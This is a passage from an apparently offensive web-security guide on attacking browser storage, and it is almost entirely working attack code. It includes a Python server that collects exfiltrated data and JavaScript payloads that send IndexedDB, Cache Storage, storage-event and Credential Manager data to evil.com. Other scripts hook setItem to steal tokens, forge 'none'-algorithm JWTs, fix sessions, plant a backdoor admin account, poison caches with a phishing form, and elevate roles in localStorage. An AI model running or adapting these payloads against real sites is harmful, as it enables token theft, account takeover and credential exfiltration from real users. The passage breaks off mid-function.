              data = json.loads(data_str)
          except:
              data = {'raw': data_str}
          
          # Analyze for sensitive data
          findings = []
          for name, pattern in SENSITIVE_PATTERNS.items():
              matches = pattern.findall(data_str)
              if matches:
                  findings.extend([{'type': name, 'value': m[:80]} for m in matches])
          
          # Log to file
          log_entry = {
              'timestamp': timestamp,
              'source_ip': source_ip,
              'user_agent': self.headers.get('User-Agent', ''),
              'referer': self.headers.get('Referer', ''),
              'origin': self.headers.get('Origin', ''),
              'data': data,
              'sensitive_findings': findings
          }
          
          filename = f"{LOG_DIR}/{timestamp}_{source_ip.replace('.', '-')}.json"
          with open(filename, 'w') as f:
              json.dump(log_entry, f, indent=2, default=str)
          
          # Console output
          print(f"\n{'='*60}")
          print(f"🎯 STORAGE DATA RECEIVED!")
          print(f"   Time: {timestamp}")
          print(f"   From: {source_ip}")
          print(f"   Origin: {self.headers.get('Origin', 'N/A')}")
          
          if isinstance(data, dict):
              ls = data.get('localStorage', data.get('l', {}))
              ss = data.get('sessionStorage', data.get('s', {}))
              cookies = data.get('cookies', data.get('c', ''))
              
              if ls:
                  print(f"\n   📦 localStorage ({len(ls)} items):")
                  for k, v in (ls.items() if isinstance(ls, dict) else []):
                      preview = str(v)[:80]
                      print(f"      {k}: {preview}")
              
              if ss:
                  print(f"\n   📋 sessionStorage ({len(ss)} items):")
                  for k, v in (ss.items() if isinstance(ss, dict) else []):
                      preview = str(v)[:80]
                      print(f"      {k}: {preview}")
              
              if cookies:
                  print(f"\n   🍪 Cookies: {str(cookies)[:200]}")
          
          if findings:
              print(f"\n   ⚠️  SENSITIVE DATA DETECTED:")
              for f in findings:
                  print(f"      [{f['type']}] {f['value']}")
          
          print(f"   📁 Saved to: {filename}")
          print(f"{'='*60}")
      
      def do_POST(self):
          content_length = int(self.headers.get('Content-Length', 0))
          body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
          self.handle_data(body)
          
          self.send_response(200)
          self.send_header('Access-Control-Allow-Origin', '*')
          self.end_headers()
          self.wfile.write(b'OK')
      
      def do_GET(self):
          parsed = urlparse(self.path)
          params = parse_qs(parsed.query)
          
          # Handle base64-encoded data
          for key, values in params.items():
              for val in values:
                  try:
                      decoded = base64.b64decode(val).decode()
                      params[key] = decoded
                  except:
                      pass
          
          self.handle_data(json.dumps(params))
          
          # Return transparent 1x1 GIF
          self.send_response(200)
          self.send_header('Content-Type', 'image/gif')
          self.send_header('Access-Control-Allow-Origin', '*')
          self.end_headers()
          self.wfile.write(
              b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
              b'\x00\x00\x00!\xf9\x04\x00\x00\x00\x00\x00,'
              b'\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;'
          )
      
      def do_OPTIONS(self):
          self.send_response(200)
          self.send_header('Access-Control-Allow-Origin', '*')
          self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
          self.send_header('Access-Control-Allow-Headers', '*')
          self.end_headers()
      
      def log_message(self, format, *args):
          pass

  if __name__ == '__main__':
      PORT = 8443
      print(f"[*] Storage Exfiltration Server on port {PORT}")
      print(f"[*] Logs directory: {LOG_DIR}/")
      HTTPServer(('0.0.0.0', PORT), CollectorHandler).serve_forever()
  ```
  :::
::

### IndexedDB Exploitation

::tabs
  :::tabs-item{icon="i-lucide-code" label="IndexedDB Deep Dump"}
  ```javascript [indexeddb-dump.js]
  // Complete IndexedDB Exfiltration
  // Extracts ALL data from ALL IndexedDB databases

  async function exfiltrateIndexedDB() {
    const EXFIL = 'https://evil.com/idb-steal';
    const allData = { databases: [], timestamp: Date.now(), origin: location.origin };

    try {
      // Get all database names
      let dbNames = [];
      
      if (indexedDB.databases) {
        const dbs = await indexedDB.databases();
        dbNames = dbs.map(d => d.name);
      } else {
        // Brute-force common database names
        dbNames = [
          'keyval-store', 'localforage', 'firebaseLocalStorageDb',
          '__dbnames', 'level-js-DATA', '_pouch_', 'idb-keyval',
          'workbox-expiration', 'workbox-precache',
          'app-database', 'offline-data', 'user-data',
          'cache-db', 'auth-db', 'session-db',
          'app-state', 'redux-store', 'vuex-store',
          'messages', 'notifications', 'files'
        ];
      }

      for (const dbName of dbNames) {
        try {
          const db = await new Promise((resolve, reject) => {
            const request = indexedDB.open(dbName);
            request.onsuccess = () => resolve(request.result);
            request.onerror = () => reject(request.error);
            // Don't trigger upgradeneeded (would create empty DB)
            request.onupgradeneeded = (e) => {
              e.target.transaction.abort();
              reject(new Error('DB does not exist'));
            };
          });

          const dbDump = {
            name: dbName,
            version: db.version,
            objectStores: {}
          };

          const storeNames = Array.from(db.objectStoreNames);
          
          for (const storeName of storeNames) {
            try {
              const tx = db.transaction(storeName, 'readonly');
              const store = tx.objectStore(storeName);
              
              // Get all records
              const records = await new Promise((resolve, reject) => {
                const req = store.getAll();
                req.onsuccess = () => resolve(req.result);
                req.onerror = () => reject(req.error);
              });
              
              // Get all keys
              const keys = await new Promise((resolve, reject) => {
                const req = store.getAllKeys();
                req.onsuccess = () => resolve(req.result);
                req.onerror = () => reject(req.error);
              });
              
              // Get index information
              const indexes = {};
              for (const indexName of Array.from(store.indexNames)) {
                const index = store.index(indexName);
                indexes[indexName] = {
                  keyPath: index.keyPath,
                  unique: index.unique,
                  multiEntry: index.multiEntry
                };
              }
              
              dbDump.objectStores[storeName] = {
                keyPath: store.keyPath,
                autoIncrement: store.autoIncrement,
                recordCount: records.length,
                indexes: indexes,
                keys: keys.slice(0, 200),
                records: records.slice(0, 500)
              };
            } catch(storeErr) {
              dbDump.objectStores[storeName] = { error: storeErr.message };
            }
          }
          
          db.close();
          allData.databases.push(dbDump);
          
        } catch(dbErr) {
          // Database doesn't exist or can't be opened — skip silently
        }
      }
    } catch(e) {
      allData.error = e.message;
    }

    // Exfiltrate
    const jsonStr = JSON.stringify(allData);
    
    // Split into chunks if large
    const CHUNK_SIZE = 50000;
    if (jsonStr.length > CHUNK_SIZE) {
      const totalChunks = Math.ceil(jsonStr.length / CHUNK_SIZE);
      for (let i = 0; i < totalChunks; i++) {
        const chunk = jsonStr.substring(i * CHUNK_SIZE, (i + 1) * CHUNK_SIZE);
        navigator.sendBeacon(EXFIL, JSON.stringify({
          chunk: i,
          total: totalChunks,
          data: chunk,
          id: allData.timestamp
        }));
        await new Promise(r => setTimeout(r, 100)); // Small delay between chunks
      }
    } else {
      navigator.sendBeacon(EXFIL, jsonStr);
    }
    
    console.log(`[+] IndexedDB exfiltrated: ${allData.databases.length} databases`);
    return allData;
  }

  exfiltrateIndexedDB();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="IndexedDB Manipulation"}
  ```javascript [indexeddb-manipulation.js]
  // IndexedDB Data Manipulation
  // Modify stored data for privilege escalation or persistence

  async function manipulateIndexedDB() {
    
    // ── Scenario 1: Modify user role in cached profile ──
    try {
      const db = await openDB('app-database');
      const tx = db.transaction('users', 'readwrite');
      const store = tx.objectStore('users');
      
      // Get current user data
      const userData = await getAll(store);
      
      for (const user of userData) {
        if (user.role === 'user') {
          // Elevate to admin
          user.role = 'admin';
          user.is_admin = true;
          user.permissions = ['*'];
          store.put(user);
          console.log('[+] User role elevated to admin in IndexedDB');
        }
      }
      
      db.close();
    } catch(e) {}

    // ── Scenario 2: Inject malicious cached API response ──
    try {
      const db = await openDB('api-cache');
      const tx = db.transaction('responses', 'readwrite');
      const store = tx.objectStore('responses');
      
      // Add fake admin API response
      store.put({
        url: '/api/me',
        response: JSON.stringify({
          id: 1,
          email: 'admin@target.com',
          role: 'admin',
          permissions: ['*']
        }),
        timestamp: Date.now()
      });
      
      db.close();
    } catch(e) {}

    // ── Scenario 3: Poison offline-first app data ──
    try {
      const db = await openDB('offline-data');
      const tx = db.transaction('pending-actions', 'readwrite');
      const store = tx.objectStore('pending-actions');
      
      // Queue malicious actions for sync
      store.put({
        id: 'backdoor-' + Date.now(),
        action: 'create_user',
        data: {
          username: 'backdoor_admin',
          password: 'H4cked2024!',
          role: 'admin'
        },
        status: 'pending',
        created: Date.now()
      });
      
      db.close();
      console.log('[+] Malicious sync action queued in IndexedDB');
    } catch(e) {}
  }

  function openDB(name) {
    return new Promise((resolve, reject) => {
      const req = indexedDB.open(name);
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error);
    });
  }

  function getAll(store) {
    return new Promise((resolve, reject) => {
      const req = store.getAll();
      req.onsuccess = () => resolve(req.result);
      req.onerror = () => reject(req.error);
    });
  }

  manipulateIndexedDB();
  ```
  :::
::

### Cache API Exploitation

::code-collapse

```javascript [cache-api-exploitation.js]
// Cache Storage Exploitation
// Extract sensitive data from Service Worker caches
// Cached API responses often contain tokens, user data, and secrets

async function exploitCacheStorage() {
  const EXFIL = 'https://evil.com/cache-steal';
  const cacheData = { caches: {}, timestamp: Date.now(), origin: location.origin };
  
  try {
    // List all caches
    const cacheNames = await caches.keys();
    console.log(`[*] Found ${cacheNames.length} caches:`, cacheNames);
    
    for (const cacheName of cacheNames) {
      const cache = await caches.open(cacheName);
      const requests = await cache.keys();
      
      cacheData.caches[cacheName] = {
        entryCount: requests.length,
        entries: []
      };
      
      for (const request of requests) {
        const response = await cache.match(request);
        
        const entry = {
          url: request.url,
          method: request.method,
          responseStatus: response.status,
          responseType: response.type,
          contentType: response.headers.get('content-type'),
          responseHeaders: {}
        };
        
        // Extract response headers
        response.headers.forEach((value, key) => {
          entry.responseHeaders[key] = value;
        });
        
        // Extract response body
        try {
          const clone = response.clone();
          const contentType = response.headers.get('content-type') || '';
          
          if (contentType.includes('json') || contentType.includes('text') || 
              contentType.includes('html') || contentType.includes('javascript') ||
              contentType.includes('xml') || contentType.includes('css')) {
            const body = await clone.text();
            entry.body = body.substring(0, 10000); // First 10KB
            
            // Check for sensitive data in cached responses
            if (body.match(/token|jwt|session|api_key|secret|password|authorization/i)) {
              entry.containsSensitiveData = true;
              console.log(`%c[!] Sensitive data in cached response: ${request.url}`,
                'color:red;font-weight:bold');
            }
            
            // Try to parse as JSON for structured extraction
            try {
              const jsonData = JSON.parse(body);
              entry.parsedJson = jsonData;
              
              // Deep search for tokens
              const jsonStr = JSON.stringify(jsonData);
              const jwtMatch = jsonStr.match(/eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+/);
              if (jwtMatch) {
                entry.extractedJWT = jwtMatch[0];
                console.log(`%c[!] JWT found in cache: ${jwtMatch[0].substring(0, 50)}...`,
                  'color:red;font-weight:bold;font-size:14px');
              }
            } catch(e) {}
          }
        } catch(bodyErr) {
          entry.bodyError = bodyErr.message;
        }
        
        cacheData.caches[cacheName].entries.push(entry);
      }
    }
  } catch(e) {
    cacheData.error = e.message;
  }
  
  // ── Cache Poisoning: Replace cached responses with malicious ones ──
  try {
    const cacheNames = await caches.keys();
    for (const cacheName of cacheNames) {
      const cache = await caches.open(cacheName);
      
      // Poison login page with phishing version
      const fakeLoginResponse = new Response(
        '<html><body><h1>Session Expired</h1>' +
        '<form action="https://evil.com/phish" method="POST">' +
        '<input name="email" placeholder="Email"><br>' +
        '<input name="password" type="password" placeholder="Password"><br>' +
        '<button>Log In</button></form></body></html>',
        {
          headers: { 'Content-Type': 'text/html' },
          status: 200
        }
      );
      
      // Only poison if we want to be destructive (commented out for safety)
      // await cache.put(new Request('/login'), fakeLoginResponse);
      // console.log('[+] Login page poisoned in cache');
    }
  } catch(e) {}
  
  // Exfiltrate cache data
  const payload = JSON.stringify(cacheData);
  navigator.sendBeacon(EXFIL, payload);
  
  console.log(`[+] Cache data exfiltrated (${(payload.length/1024).toFixed(1)} KB)`);
  return cacheData;
}

exploitCacheStorage();
```

::

### Storage Event Hijacking

::tabs
  :::tabs-item{icon="i-lucide-code" label="Cross-Tab Storage Sniffing"}
  ```javascript [storage-event-sniffing.js]
  // Storage Event Hijacking
  // localStorage changes fire 'storage' events in OTHER tabs of same origin
  // If attacker has XSS in any tab, they can monitor ALL storage changes

  (function() {
    'use strict';
    
    const EXFIL = 'https://evil.com/storage-events';
    const capturedEvents = [];
    
    // Listen for storage events from OTHER tabs
    window.addEventListener('storage', function(event) {
      const eventData = {
        key: event.key,
        oldValue: event.oldValue,
        newValue: event.newValue,
        url: event.url,           // URL of the page that changed storage
        storageArea: event.storageArea === localStorage ? 'localStorage' : 'sessionStorage',
        timestamp: new Date().toISOString()
      };
      
      capturedEvents.push(eventData);
      
      console.log(`[+] Storage change detected:`);
      console.log(`    Key: ${event.key}`);
      console.log(`    Old: ${(event.oldValue || '').substring(0, 100)}`);
      console.log(`    New: ${(event.newValue || '').substring(0, 100)}`);
      console.log(`    From: ${event.url}`);
      
      // Check if the changed value is sensitive
      const isSensitive = /token|jwt|session|auth|key|secret|password/i.test(event.key) ||
                          /eyJ[A-Za-z0-9-_]+\.eyJ/.test(event.newValue || '');
      
      if (isSensitive) {
        console.log(`%c    ⚠ SENSITIVE STORAGE CHANGE!`, 'color:red;font-weight:bold');
        
        // Immediately exfiltrate sensitive changes
        navigator.sendBeacon(EXFIL, JSON.stringify({
          type: 'sensitive_change',
          event: eventData
        }));
      }
      
      // Exfiltrate periodically
      if (capturedEvents.length >= 10) {
        navigator.sendBeacon(EXFIL, JSON.stringify({
          type: 'batch',
          events: capturedEvents.splice(0)
        }));
      }
    });
    
    // Also intercept direct storage API calls on THIS page
    const origSetItem = Storage.prototype.setItem;
    const origRemoveItem = Storage.prototype.removeItem;
    const origClear = Storage.prototype.clear;
    
    Storage.prototype.setItem = function(key, value) {
      console.log(`[*] Storage.setItem('${key}', '${String(value).substring(0, 80)}')`);
      
      // Capture the write
      navigator.sendBeacon(EXFIL, JSON.stringify({
        type: 'setItem',
        storage: this === localStorage ? 'local' : 'session',
        key: key,
        value: value,
        url: location.href,
        timestamp: Date.now()
      }));
      
      return origSetItem.call(this, key, value);
    };
    
    Storage.prototype.removeItem = function(key) {
      const oldValue = this.getItem(key);
      console.log(`[*] Storage.removeItem('${key}') — was: ${(oldValue || '').substring(0, 80)}`);
      
      navigator.sendBeacon(EXFIL, JSON.stringify({
        type: 'removeItem',
        key: key,
        oldValue: oldValue,
        url: location.href
      }));
      
      return origRemoveItem.call(this, key);
    };
    
    Storage.prototype.clear = function() {
      // Dump everything before it's cleared
      const allData = {};
      for (let i = 0; i < this.length; i++) {
        const k = this.key(i);
        allData[k] = this.getItem(k);
      }
      
      console.log('[!] Storage.clear() called — dumping all data first');
      navigator.sendBeacon(EXFIL, JSON.stringify({
        type: 'clear',
        storage: this === localStorage ? 'local' : 'session',
        dataBefore: allData,
        url: location.href
      }));
      
      return origClear.call(this);
    };
    
    console.log('[*] Storage event monitor and API interceptor active');
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="Storage Event Attack Flow"}
  ```text [storage-event-flow.txt]
  STORAGE EVENT HIJACKING FLOW:
  ═════════════════════════════
  
  ┌─────────────────┐  storage event   ┌──────────────────┐
  │ Tab A            │ ───────────────▶ │ Tab B (Attacker)  │
  │ (Victim)         │                  │                   │
  │                  │                  │ Listens for ALL   │
  │ User logs in     │                  │ storage changes   │
  │ → token stored   │  {               │                   │
  │   in localStorage│   key: 'token',  │ Captures:         │
  │                  │   newValue: JWT, │ ├── Auth tokens    │
  │ User updates     │   url: '/login'  │ ├── Session data   │
  │   settings       │  }               │ ├── User profile   │
  │ → data stored    │                  │ └── All changes    │
  │                  │                  │                   │
  └─────────────────┘                  └──────────────────┘
  
  KEY INSIGHT:
  ════════════
  localStorage 'storage' events fire in ALL OTHER tabs
  of the same origin. If attacker has persistent XSS
  (or a tab open with injected script), they passively
  capture EVERY storage change made by the victim in
  other tabs — including fresh tokens on login!
  
  REQUIREMENTS:
  ├── XSS on the target origin (any page)
  ├── Victim must have attacker's tab open
  │   (or injected script running via persistent XSS)
  ├── Victim performs actions in other tabs
  └── Changes occur in localStorage (not sessionStorage*)
  
  *sessionStorage events don't fire across tabs
  ```
  :::
::

### Token Manipulation & Session Fixation

::tabs
  :::tabs-item{icon="i-lucide-code" label="JWT Token Manipulation"}
  ```javascript [jwt-manipulation.js]
  // JWT Token Manipulation via Web Storage
  // Decode, modify, and attempt to use altered JWTs

  (function() {
    // Find JWT tokens in all storage
    const tokens = {};
    
    // Search localStorage
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      const value = localStorage.getItem(key);
      if (value && value.match(/^eyJ[A-Za-z0-9-_]+\.eyJ[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/)) {
        tokens[`localStorage.${key}`] = value;
      }
    }
    
    // Search sessionStorage
    for (let i = 0; i < sessionStorage.length; i++) {
      const key = sessionStorage.key(i);
      const value = sessionStorage.getItem(key);
      if (value && value.match(/^eyJ[A-Za-z0-9-_]+\.eyJ/)) {
        tokens[`sessionStorage.${key}`] = value;
      }
    }
    
    // Decode and analyze each JWT
    for (const [location, jwt] of Object.entries(tokens)) {
      const parts = jwt.split('.');
      
      try {
        const header = JSON.parse(atob(parts[0].replace(/-/g, '+').replace(/_/g, '/')));
        const payload = JSON.parse(atob(parts[1].replace(/-/g, '+').replace(/_/g, '/')));
        
        console.log(`\n[+] JWT found at: ${location}`);
        console.log('    Header:', header);
        console.log('    Payload:', payload);
        console.log('    Algorithm:', header.alg);
        
        // Check for vulnerabilities
        if (header.alg === 'none' || header.alg === 'None' || header.alg === 'NONE') {
          console.log('%c    [!!!] Algorithm "none" — token may be unsigned!', 
            'color:red;font-weight:bold');
        }
        
        if (header.alg === 'HS256') {
          console.log('    [!] HS256 — may be vulnerable to alg confusion attack');
        }
        
        // Check expiration
        if (payload.exp) {
          const expDate = new Date(payload.exp * 1000);
          const isExpired = expDate < new Date();
          console.log(`    Expires: ${expDate.toISOString()} (${isExpired ? 'EXPIRED' : 'VALID'})`);
        } else {
          console.log('    [!] No expiration set — token never expires!');
        }
        
        // Check claims
        console.log('    User ID:', payload.sub || payload.user_id || payload.uid);
        console.log('    Role:', payload.role || payload.roles || payload.scope);
        console.log('    Email:', payload.email);
        
        // ── Attempt "none" algorithm attack ──
        const modifiedPayload = { ...payload, role: 'admin', is_admin: true };
        const noneHeader = { alg: 'none', typ: 'JWT' };
        const forgedToken = 
          btoa(JSON.stringify(noneHeader)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_') + '.' +
          btoa(JSON.stringify(modifiedPayload)).replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_') + '.';
        
        console.log('    [*] "none" algorithm forged token:', forgedToken.substring(0, 80) + '...');
        
        // ── Attempt to set modified token ──
        // (This would only work if server doesn't verify signatures properly)
        // localStorage.setItem('token', forgedToken);
        
      } catch(e) {
        console.log(`[-] Failed to decode JWT at ${location}:`, e.message);
      }
    }
    
    // Report findings
    console.log(`\n[*] Found ${Object.keys(tokens).length} JWT tokens total`);
    
    // Exfiltrate
    navigator.sendBeacon('https://evil.com/jwt-analysis', JSON.stringify({
      tokens: tokens,
      origin: location.origin,
      timestamp: Date.now()
    }));
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Storage-Based Session Fixation"}
  ```javascript [session-fixation-storage.js]
  // Session Fixation via Web Storage
  // Pre-set attacker's token in victim's storage before they authenticate

  // ── SCENARIO 1: Reflected XSS → Token Injection ──
  // URL: https://target.com/page?q=<script>localStorage.setItem('token','ATTACKER_TOKEN')</script>
  
  // ── SCENARIO 2: DOM XSS → Token Injection ──
  // URL: https://target.com/page#"><img src=x onerror="localStorage.setItem('token','ATTACKER_TOKEN')">
  
  // ── SCENARIO 3: Pre-login Token Fixation ──
  // If the app stores auth tokens in localStorage:
  (function() {
    // Step 1: Set attacker's session token BEFORE victim logs in
    const attackerToken = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhdHRhY2tlciIsInJvbGUiOiJ1c2VyIn0.signature';
    
    localStorage.setItem('token', attackerToken);
    localStorage.setItem('access_token', attackerToken);
    localStorage.setItem('auth_token', attackerToken);
    
    // Step 2: If app checks for existing token on page load,
    //         it may use the attacker's token for subsequent requests
    //         → Attacker and victim share the same session
    
    // Step 3: Monitor for new token (victim logs in → new token set)
    const origSetItem = Storage.prototype.setItem;
    Storage.prototype.setItem = function(key, value) {
      if (/token|auth|session|jwt/i.test(key) && value !== attackerToken) {
        // Victim just logged in! Steal their new token
        console.log('[+] New auth token detected:', key);
        new Image().src = 'https://evil.com/fixation?k=' + key + '&t=' + btoa(value);
      }
      return origSetItem.call(this, key, value);
    };
  })();

  // ── SCENARIO 4: Token Swap Attack ──
  // Replace victim's valid token with attacker-controlled one
  (function() {
    // Wait for victim to be authenticated
    const checkInterval = setInterval(() => {
      const token = localStorage.getItem('token');
      if (token && token.startsWith('eyJ')) {
        // Steal the good token
        navigator.sendBeacon('https://evil.com/token-swap', JSON.stringify({
          stolen_token: token,
          origin: location.origin
        }));
        
        // Replace with attacker's token (optional — for account takeover confusion)
        // localStorage.setItem('token', 'attacker_controlled_token');
        
        clearInterval(checkInterval);
      }
    }, 1000);
  })();
  ```
  :::
::

---

## Privilege Escalation via Web Storage

::caution
Web Storage privilege escalation works by **modifying stored role/permission data**, **stealing admin tokens**, **manipulating cached authorization responses**, or **injecting elevated credentials** into the client-side state that applications trust without server-side re-validation.
::

### PrivEsc — Client-Side Role Elevation

::tabs
  :::tabs-item{icon="i-lucide-code" label="Direct Role Modification"}
  ```javascript [privesc-role-modification.js]
  // Client-Side Privilege Escalation via localStorage Manipulation
  // Many SPAs store user role/permissions in localStorage and trust it

  (function() {
    console.log('[*] Starting client-side privilege escalation...');
    
    // ── Strategy 1: Modify user object in localStorage ──
    const userKeys = ['user', 'currentUser', 'auth_user', 'profile', 
                      'user_data', 'userData', 'session_user', 'me'];
    
    for (const key of userKeys) {
      const stored = localStorage.getItem(key);
      if (stored) {
        try {
          const user = JSON.parse(stored);
          console.log(`[+] Found user data in localStorage["${key}"]:`, user);
          
          // Elevate privileges
          const original = { ...user };
          
          user.role = 'admin';
          user.roles = ['admin', 'superadmin', 'root'];
          user.is_admin = true;
          user.is_superuser = true;
          user.isAdmin = true;
          user.isSuperUser = true;
          user.admin = true;
          user.permissions = ['*', 'admin:*', 'users:*', 'settings:*'];
          user.subscription = 'enterprise';
          user.plan = 'unlimited';
          user.tier = 'admin';
          user.group = 'administrators';
          user.access_level = 999;
          user.privilege = 'root';
          
          // Features and flags
          user.features = user.features || {};
          user.features.admin_panel = true;
          user.features.user_management = true;
          user.features.billing = true;
          user.features.api_access = true;
          user.features.export = true;
          user.features.debug = true;
          
          localStorage.setItem(key, JSON.stringify(user));
          console.log(`[+] Elevated localStorage["${key}"] to admin`);
          
          // Also try sessionStorage
          sessionStorage.setItem(key, JSON.stringify(user));
          
        } catch(e) {}
      }
    }
    
    // ── Strategy 2: Modify feature flags ──
    const flagKeys = ['featureFlags', 'feature_flags', 'flags', 'features',
                      'ff', 'experiments', 'ab_tests', 'config'];
    
    for (const key of flagKeys) {
      const stored = localStorage.getItem(key);
      if (stored) {
        try {
          const flags = JSON.parse(stored);
          console.log(`[+] Found feature flags in "${key}":`, flags);
          
          // Enable all features
          if (typeof flags === 'object') {
            for (const [flagName, flagValue] of Object.entries(flags)) {
              if (typeof flagValue === 'boolean') {
                flags[flagName] = true;
              }
            }
            // Add admin features
            flags.admin_panel = true;
            flags.debug_mode = true;
            flags.developer_tools = true;
            flags.beta_features = true;
            flags.premium_features = true;
            
            localStorage.setItem(key, JSON.stringify(flags));
            console.log(`[+] All feature flags enabled in "${key}"`);
          }
        } catch(e) {}
      }
    }
    
    // ── Strategy 3: Modify auth state ──
    const authKeys = ['auth', 'auth_state', 'authState', 'authenticated',
                      'isAuthenticated', 'loggedIn', 'session'];
    
    for (const key of authKeys) {
      const stored = localStorage.getItem(key);
      if (stored) {
        try {
          let auth = JSON.parse(stored);
          
          if (typeof auth === 'object') {
            auth.isAuthenticated = true;
            auth.isAdmin = true;
            auth.role = 'admin';
            auth.mfaVerified = true;
            auth.emailVerified = true;
            
            localStorage.setItem(key, JSON.stringify(auth));
            console.log(`[+] Auth state elevated in "${key}"`);
          }
        } catch(e) {
          // Might be a simple boolean string
          if (stored === 'false') {
            localStorage.setItem(key, 'true');
          }
        }
      }
    }
    
    // ── Strategy 4: Reload page to apply changes ──
    console.log('[*] Reloading page to apply elevated privileges...');
    // location.reload();  // Uncomment to auto-reload
    console.log('[*] Or manually reload to see if admin UI appears');
  })();
  ```
  :::

  :::tabs-item{icon="i-lucide-info" label="PrivEsc Attack Chains"}
  ```text [privesc-chains.txt]
  WEB STORAGE PRIVILEGE ESCALATION CHAINS:
  ═════════════════════════════════════════
  
  CHAIN 1: XSS → Token Theft → Admin API Access
  ──────────────────────────────────────────────
  1. Achieve XSS on target application
  2. Read admin's JWT from localStorage
  3. Exfiltrate token to attacker's server
  4. Use token to call admin-only API endpoints
  5. Create backdoor admin account via API
  Result: Persistent admin access
  
  CHAIN 2: XSS → Role Manipulation → Client-Side Admin
  ────────────────────────────────────────────────────
  1. Achieve XSS on target application
  2. Modify user role in localStorage from 'user' to 'admin'
  3. Reload page → admin UI elements appear
  4. If app doesn't re-verify role server-side → full admin
  5. If it does → still reveals admin endpoints/routes
  Result: Admin interface access, endpoint discovery
  
  CHAIN 3: Subdomain XSS → Cross-Subdomain Token Theft
  ─────────────────────────────────────────────────────
  1. Find XSS on subdomain (blog.target.com)
  2. If cookies are set with Domain=.target.com → steal session cookies
  3. localStorage is origin-isolated BUT:
  4. Can create iframe to app.target.com and use postMessage
  5. Or use stolen cookies to authenticate as victim
  Result: Cross-subdomain account takeover
  
  CHAIN 4: Storage Event → Passive Token Collection
  ─────────────────────────────────────────────────
  1. Achieve persistent XSS (stored in comments, profile, etc.)
  2. Install storage event listener
  3. Every time victim logs in (any tab), new token fires event
  4. Attacker passively collects fresh tokens continuously
  5. Each token gives authenticated access until rotation
  Result: Continuous access to victim's sessions
  
  CHAIN 5: IndexedDB Poisoning → Cached Response Manipulation
  ───────────────────────────────────────────────────────────
  1. Achieve XSS on target application
  2. Modify cached API responses in IndexedDB
  3. Change cached /api/me response to include admin role
  4. Offline-first app reads from cache → believes user is admin
  5. App renders admin UI and potentially admin-only actions
  Result: Admin access in offline-first applications
  
  CHAIN 6: Cache API Poisoning → Persistent XSS
  ──────────────────────────────────────────────
  1. Achieve XSS on target application
  2. Poison CacheStorage with modified HTML responses
  3. Inject <script> into cached HTML pages
  4. Even if XSS is fixed, cached version persists
  5. Every visit serves poisoned cached version
  Result: Persistent XSS surviving vulnerability patches
  ```
  :::
::

### PrivEsc — Cross-Origin Storage Attacks

::code-collapse

```javascript [cross-origin-storage-attack.js]
// Cross-Origin Storage Exploitation Techniques
// Attacking storage across origins via various channels

(function() {
  'use strict';
  
  console.log('[*] Cross-Origin Storage Attack Toolkit');

  // ═══ TECHNIQUE 1: SharedArrayBuffer Timing Attack ═══
  // Side-channel to infer localStorage contents cross-origin
  // (Requires certain headers — largely mitigated but conceptually important)
  
  // ═══ TECHNIQUE 2: Broadcast Channel Exploitation ═══
  // If attacker has XSS on same origin, BroadcastChannel crosses tabs
  async function broadcastChannelAttack() {
    // Try common channel names used by target app
    const channelNames = [
      'auth', 'session', 'sync', 'notifications', 'state',
      'redux', 'vuex', 'updates', 'config', 'user'
    ];
    
    for (const name of channelNames) {
      try {
        const bc = new BroadcastChannel(name);
        
        bc.onmessage = function(event) {
          console.log(`[+] BroadcastChannel "${name}" message:`, event.data);
          
          // Exfiltrate any tokens or sensitive data
          navigator.sendBeacon('https://evil.com/bc-steal', JSON.stringify({
            channel: name,
            data: event.data,
            origin: location.origin
          }));
        };
        
        // Try requesting data
        bc.postMessage({ type: 'getState' });
        bc.postMessage({ type: 'getToken' });
        bc.postMessage({ type: 'sync' });
        bc.postMessage('ping');
        
      } catch(e) {}
    }
  }

  // ═══ TECHNIQUE 3: SharedWorker Data Extraction ═══
  async function sharedWorkerAttack() {
    try {
      // Connect to existing SharedWorkers
      const worker = new SharedWorker('/shared-worker.js');
      
      worker.port.onmessage = function(event) {
        console.log('[+] SharedWorker message:', event.data);
        
        // SharedWorkers can access IndexedDB and CacheStorage
        // Messages from the worker may contain shared state/tokens
        navigator.sendBeacon('https://evil.com/sw-steal', JSON.stringify({
          data: event.data,
          origin: location.origin
        }));
      };
      
      worker.port.start();
      
      // Request data from the worker
      worker.port.postMessage({ type: 'getState' });
      worker.port.postMessage({ type: 'getAllData' });
      worker.port.postMessage({ cmd: 'dump' });
      
    } catch(e) {
      console.log('[-] SharedWorker not available:', e.message);
    }
  }

  // ═══ TECHNIQUE 4: Credential Manager API ═══
  async function credentialManagerAttack() {
    try {
      if (navigator.credentials) {
        // Try to get stored passwords
        const credential = await navigator.credentials.get({
          password: true,
          mediation: 'silent' // Don't show UI prompt
        });
        
        if (credential) {
          console.log('%c[+] CREDENTIAL FOUND!', 'color:red;font-weight:bold;font-size:16px');
          console.log('    Type:', credential.type);
          console.log('    ID:', credential.id);
          console.log('    Name:', credential.name);
          
          if (credential.type === 'password') {
            console.log('    Password:', credential.password);
            
            navigator.sendBeacon('https://evil.com/cred-steal', JSON.stringify({
              type: credential.type,
              id: credential.id,
              name: credential.name,
              password: credential.password,
              origin: location.origin
            }));
          }
        }
      }
    } catch(e) {
      console.log('[-] Credential Manager:', e.message);
    }
  }

  // ═══ TECHNIQUE 5: File System Access API (if available) ═══
  async function fileSystemAttack() {
    try {
      if (window.showDirectoryPicker || navigator.storage) {
        // OPFS (Origin Private File System) — no user prompt needed!
        const root = await navigator.storage.getDirectory();
        
        // List all files in origin-private storage
        for await (const [name, handle] of root.entries()) {
          console.log(`[+] OPFS file: ${name} (${handle.kind})`);
          
          if (handle.kind === 'file') {
            const file = await handle.getFile();
            const content = await file.text();
